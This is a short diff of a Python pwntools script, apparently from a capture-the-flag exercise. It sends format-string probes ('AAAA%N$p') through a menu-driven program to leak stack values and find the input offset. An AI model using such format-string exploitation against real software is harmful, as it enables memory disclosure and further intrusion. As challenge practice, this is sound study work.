@@ -4,9 +4,9 @@ context.log_level = 'debug'
 
 def detect(io):
 	for i in range(100):
-		if i+1 == 9:
+		if i+1 == 9 or i+1 == 10:
 			continue
-		svar = '%'+str(i+1)+'$p'
+		svar = 'AAAA%'+str(i+1)+'$p'
 		io.recvuntil('2. Space food')
 		io.sendline(b'1')
 		io.recvuntil('3. Deathstar(70.00 s.rocks)')
